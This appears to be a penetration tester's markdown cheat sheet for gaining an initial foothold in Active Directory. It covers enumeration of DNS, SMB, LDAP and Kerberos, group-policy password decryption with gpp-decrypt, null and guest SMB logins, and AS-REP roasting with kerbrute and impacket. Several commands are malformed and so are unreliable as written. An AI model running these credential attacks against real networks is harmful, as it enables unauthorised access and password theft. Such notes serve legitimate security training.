# Getting Initial Foodhold (We need Credentials!! User names are gold :) )
1. Determine the IP address or hostname of the Active Directory server. If we seen( port 53 445, 389, 88, we are most likely dealing with AD)
2. Enumerate DNS
3. Check open ports: Enumerate SMB: If port 445 is open, use tools like enum4linux, smbmap, smbclient crackmapexec to gather information about the SMB service, such as shared folders and users.
4. Enumerate LDAP: If port 389 or 3268/3269 is open, use tools like ldapsearch, to gather information about the LDAP directory service, such as users, groups, and organizational units.
5. Enumerate Kerberos: If port 88 is open, use tools like krb5-enum-users or enum-users-gpp-decrypt to enumerate users and potentially crack Kerberos passwords.
6. Enumerate RPC: If port 135 is open, use tools like rpcclient or nmap-rpc-info to gather information about the RPC service and potentially identify vulnerable endpoints.
7. Check for group policy: (Groups.xml for Windows 12 and below) Look for group policy information in the directory, use tools like gpp-decrypt to decrypt and extract any saved credentials.
   - open the Groups.xml file. decrpyt the password hash by `gpp-decrypt $HASH`
9. Check for computer accounts: Look for computer accounts in the directory, which can be used to identify and target specific systems on the network.
10. Look for organizational units (OUs): Check for OUs in the directory, which can be used to identify the structure and organization of the network.
11. https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg  Look at this roadmap

## Enumeration
1. `nmap -sC -sV -p -oA result 10.0.0.0./8`
2. Edit host file `subl /etc/hosts to add domain`

## Port 53 DNS
1. `nslookup` 
2. `server $IP` then type -> `$IP` to figure out the host name. 
3. `dnsrecon -d $IP -r $IP
4. 
## Port 445 SMB (Check SMB.md file)
1. `nmap --script safe -p 445, $IP`
2. `enum4linux $IP`
3. `smbmap -H $IP` (anonymous login) 
4. `smbmap -R $Filename $IP` (list the content of the directroy)
5. `smbmap -R Filename $IP -A $FiletoDownload -q` (Download the intersting file such as Groups.xml)  `update db` and `locate $Filename`. 
6. 'crackmapexec smb -u '' -p'' $IP` or `crackmapexec smb -u 'guest' -p''` to try to access.

## AS-REP Roasting (Authentication Reply Roasting)
1. If pre-authentication is disabled, and we provide a list of userlists to the domain controller (AS-REQ), the DC will grant us TGT. If the passwords are weak, we can crack the TGT and gain access. We can use krebrute, impacket, or crackmap
2. `kerbrute userenum --dc $IP -d DOMAIN.NAME user.txt` user.txt is a userlist that we have created to authenticate to DC.
3. `impacket-GetNPUsers -userfile user.txt -dc-ip $IP DOMAIN.NAME\`
4. Crack the hash
